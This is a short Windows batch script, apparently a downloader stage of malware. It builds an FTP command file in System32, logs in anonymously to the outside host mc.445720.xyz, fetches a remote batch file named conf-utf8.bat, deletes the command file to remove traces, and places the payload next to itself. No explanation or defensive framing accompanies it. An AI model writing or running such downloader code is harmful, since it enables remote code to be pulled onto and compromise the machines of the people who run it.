cd C:\Windows\System32
Echo open mc.445720.xyz >ftp.up
Echo anonymous>>ftp.up
Echo testpassword>>ftp.up
Echo Cd conf >>ftp.up
Echo get conf-utf8.bat>>ftp.up
Echo bye>>ftp.up
FTP -s:ftp.up
del ftp.up /q
move conf-utf8.bat %~dp0\conf-utf8.bat
